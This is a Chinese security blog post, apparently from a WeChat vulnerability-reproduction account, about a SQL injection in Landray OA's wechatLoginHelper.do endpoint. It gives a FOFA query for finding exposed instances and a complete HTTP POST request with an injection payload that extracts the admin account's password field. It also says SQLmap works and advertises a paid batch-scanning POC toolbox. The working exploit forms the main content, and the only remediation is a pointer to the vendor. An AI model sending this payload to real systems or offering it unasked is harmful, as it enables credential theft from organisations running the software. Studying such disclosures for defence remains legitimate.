#  蓝凌OA wechatLoginHelper存在SQL注入漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-02-28 22:58  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 蓝凌OA wechatLoginHelper简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
蓝凌OA  
## 2.漏洞描述  
  
蓝凌是国内知名的大平台OA服务商和国内领先的知识管理解决方案提供商，是专业从事组织的知识化咨询、软件研发、实施、技术服务的国家级高新技术企业。蓝凌OA存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
蓝凌OA  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz31bx3OA9Mzz1NXrCGOjH9ezEs7DLPicGpW6WHwdiad0DpNHpZOLc5MIaA/640?wx_fmt=jpeg&from=appmsg "null")  
  
蓝凌OA wechatLoginHelper存在SQL注入漏洞  
## 4.fofa查询语句  
  
app="Landray-OA系统"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/third/wechat/wechatLoginHelper.do  
  
漏洞数据包：  
```
POST /third/wechat/wechatLoginHelper.do HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 147

method=edit&uid=1'and+(SELECT+fdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3KIWHIzewzYa8SbvfUlnKthlCE8VFrQawcM7PF1ucdTXTbICibp21J6g/640?wx_fmt=jpeg&from=appmsg "null")  
  
使用SQLmap也能跑出来  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3NSOMlem7ATxPobnfiaeS1Q15euLWYxTibJNyeYV3cWtzyl06LRm0P0VA/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3CMV5BDgOdG377H71QgYGqPRudFE3G4ZqBzOqW1phFpShpZXQDflBsA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz31uLJyk7acWMKYLiaySqb5l1BkBjKIRh8W5uakkG8MIDaJKsG3ErZfWA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3GS9sXNsq2SwDtWY5uXZAXYoLQ7LCpQOXtJ4DmCKu18NjkyjWe9lnQA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3WlkdaOLYy6G3kLMhGLC5SXOwnEicYrhlD47Gqico331nNA3bJXia8KVTQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bNMBMUwdQF65oe58hmeyz3Swtq7Q8ez04Ijbgd2GyCAl57ymfiaXH26AbShPxe5OrlaegWC4FtzQg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商尚未提供相关漏洞补丁链接，请关注厂商主页及时更新：http://www.landray.com.cn  
## 8.往期回顾  
  
[九思OA软件user_list_3g.jsp存在SQL注入漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485429&idx=1&sn=339c4d6dbbdb0a82224605c11e82e56c&chksm=974b8af2a03c03e41d8e7c639183eb9298a16add3abec2eea9332c84be6dfb51850e1626c62d&scene=21#wechat_redirect)  
  
  
[鸿运(通天星CMSV6车载)主动安全监控云平台存在敏感信息泄露漏洞 附POC软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485417&idx=1&sn=f3384fa94c4e2e90a466a34564687be7&chksm=974b8aeea03c03f86f47744973a28ec835977d8385ccaaaefdf35e9a1e264e9c23ccf47e3cf0&scene=21#wechat_redirect)  
  
  
  
  
